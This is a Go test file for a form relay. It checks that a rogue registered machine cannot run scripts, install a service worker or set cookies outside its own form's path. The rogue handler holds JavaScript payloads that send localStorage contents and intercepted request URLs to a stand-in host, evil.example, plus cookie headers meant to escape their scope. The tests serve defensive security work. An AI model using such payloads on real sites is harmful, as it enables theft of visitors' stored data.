package relay

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/GabrielVidal1/ask-form/internal/tunnel"
)

// A machine that registered itself can answer its own form's link with
// anything. The relay serves that on the origin every machine shares, so it
// must not let it run script there, install a service worker or set cookies
// beyond its own form's path.
func TestRogueMachineIsConfined(t *testing.T) {
	dir := t.TempDir()
	mfile := filepath.Join(dir, "machines.json")
	tok, err := AddMachine(mfile, "rogue")
	if err != nil {
		t.Fatal(err)
	}
	r, err := New(Config{MachinesFile: mfile})
	if err != nil {
		t.Fatal(err)
	}
	pub := httptest.NewServer(r.Public())
	mach := httptest.NewServer(r.MachineAPI())
	const id = "evil_abc123"
	rogue := http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		h := w.Header()
		switch req.URL.Path {
		case "/f/" + id + "/sw":
			h.Set("Content-Type", "text/javascript")
			w.Write([]byte(`self.addEventListener("fetch", e => fetch("https://evil.example/?" + e.request.url))`))
		case "/f/" + id + "/frame/x":
			h.Set("Content-Type", "text/html")
			h.Set("Content-Security-Policy", "script-src 'unsafe-inline'; sandbox allow-scripts allow-same-origin")
			w.Write([]byte(`<script>for (k in localStorage) fetch("https://evil.example/?" + localStorage[k])</script>`))
		case "/f/" + id + "/samesite":
			h.Set("Content-Type", "text/html")
			h.Set("Content-Security-Policy", "sandbox allow-scripts allow-same-origin")
			w.Write([]byte(`<script>localStorage</script>`))
		default:
			h.Set("Content-Type", "text/html")
			h.Set("Content-Security-Policy", "script-src 'unsafe-inline'")
			h.Set("X-Content-Type-Options", "sniff-away")
			h.Add("Set-Cookie", "bomb=xxxx; Path=/")
			h.Add("Set-Cookie", "other=1; Path=/f/victim_zzz999")
			h.Add("Set-Cookie", "wide=1; Path=/f/"+id+"; Domain=example.com")
			h.Add("Set-Cookie", "ask_form=t; Path=/f/"+id+"; HttpOnly; Secure")
			h.Add("Set-Cookie", "ask_form_old=t; Path=/forms/"+id+"; HttpOnly; Secure")
			w.Write([]byte(`<script>for (k in localStorage) fetch("https://evil.example/?" + localStorage[k])</script>`))
		}
	})
	ag := &tunnel.Agent{RelayURL: mach.URL, Token: tok, Handler: rogue, Forms: func() []string { return []string{id} }, Pollers: 2}
	ctx, cancel := context.WithCancel(context.Background())
	go ag.Run(ctx)
	t.Cleanup(func() { cancel(); pub.Close(); mach.Close() })
	for i := 0; i < 200 && r.Health("").Forms == 0; i++ {
		time.Sleep(10 * time.Millisecond)
	}

	get := func(path string) *http.Response {
		t.Helper()
		res, err := http.Get(pub.URL + path)
		if err != nil {
			t.Fatal(err)
		}
		io.Copy(io.Discard, res.Body)
		res.Body.Close()
		return res
	}

	page := get("/f/" + id)
	if page.StatusCode != http.StatusOK {
		t.Fatalf("page: %d", page.StatusCode)
	}
	if !hasPolicy(page.Header, "script-src 'self'") || !hasPolicy(page.Header, "worker-src 'none'") {
		t.Fatalf("a page that isn't sandboxed runs only the relay's scripts: %q", page.Header.Values("Content-Security-Policy"))
	}
	if page.Header.Get("X-Content-Type-Options") != "nosniff" {
		t.Fatalf("nosniff: %q", page.Header.Get("X-Content-Type-Options"))
	}
	var names []string
	for _, c := range page.Cookies() {
		names = append(names, c.Name)
	}
	if strings.Join(names, ",") != "ask_form,ask_form_old" {
		t.Fatalf("only cookies scoped to the form's own path may pass: %v", names)
	}

	if sw := get("/f/" + id + "/sw"); sw.StatusCode != http.StatusBadGateway {
		t.Fatalf("a script from a machine: %d %q", sw.StatusCode, sw.Header.Get("Content-Type"))
	}

	// A frame may run its inline script, but in an opaque origin, whatever
	// sandbox the machine asks for.
	if frame := get("/f/" + id + "/frame/x"); !hasPolicy(frame.Header, "sandbox allow-scripts") || hasPolicy(frame.Header, "script-src 'self'") {
		t.Fatalf("frame: %q", frame.Header.Values("Content-Security-Policy"))
	}
	// Anywhere else, a sandbox of the machine's doesn't lift the relay's policy.
	if same := get("/f/" + id + "/samesite"); !hasPolicy(same.Header, "script-src 'self'") {
		t.Fatalf("a machine's own sandbox: %q", same.Header.Values("Content-Security-Policy"))
	}
}

// hasPolicy: one of h's CSP headers is exactly p, or has p as a directive.
func hasPolicy(h http.Header, p string) bool {
	for _, v := range h.Values("Content-Security-Policy") {
		for _, d := range strings.Split(v, ";") {
			if strings.TrimSpace(d) == p {
				return true
			}
		}
	}
	return false
}

// The machine's real pages keep working behind the confinement: a frame keeps
// its own policy (and its pinned script) next to the relay's sandbox, the
// token visit its form cookie.
func TestConfinementKeepsRealPages(t *testing.T) {
	rg := newRig(t)
	code, f := rg.api(t, "POST", "/v1/forms", map[string]any{
		"title":  "Frames",
		"fields": json.RawMessage(`[{"type":"html","key":"blk","html":"<p>hi</p>"},{"key":"x","type":"text"}]`),
	}, nil)
	if code != http.StatusCreated {
		t.Fatalf("create: %d %v", code, f)
	}
	id, link := f["id"].(string), f["url"].(string)
	tokenQ := link[strings.Index(link, "?"):]
	res, err := http.Get(rg.pub.URL + "/f/" + id + "/frame/blk" + tokenQ)
	if err != nil {
		t.Fatal(err)
	}
	res.Body.Close()
	csp := res.Header.Values("Content-Security-Policy")
	if res.StatusCode != 200 || len(csp) != 2 || !strings.Contains(csp[0], "script-src 'sha256-") || csp[1] != "sandbox allow-scripts" {
		t.Fatalf("frame through the relay: %d %q", res.StatusCode, csp)
	}
	res, err = (&http.Client{CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}).Get(link)
	if err != nil {
		t.Fatal(err)
	}
	res.Body.Close()
	if res.StatusCode != http.StatusFound || len(res.Cookies()) != 1 || res.Cookies()[0].Path != "/f/"+id {
		t.Fatalf("token visit keeps its form cookie: %d %v", res.StatusCode, res.Cookies())
	}
}

// The examples count their submits by the visitor the relay sees, read from
// its proxy headers as everywhere else (a header list, Cloudflare).
func TestExamplesSeeTheVisitor(t *testing.T) {
	seen := make(chan string, 1)
	r, err := New(Config{
		MachinesFile: filepath.Join(t.TempDir(), "m.json"), ClientIPHeader: "Cf-Connecting-Ip,X-Real-Ip",
		Examples: http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) { seen <- req.RemoteAddr }),
	})
	if err != nil {
		t.Fatal(err)
	}
	pub := httptest.NewServer(r.Public())
	defer pub.Close()
	req, _ := http.NewRequest("GET", pub.URL+"/examples", nil)
	req.Header.Set("X-Real-Ip", "203.0.113.7")
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	res.Body.Close()
	if got := <-seen; got != "203.0.113.7:0" {
		t.Fatalf("examples saw %q", got)
	}
}
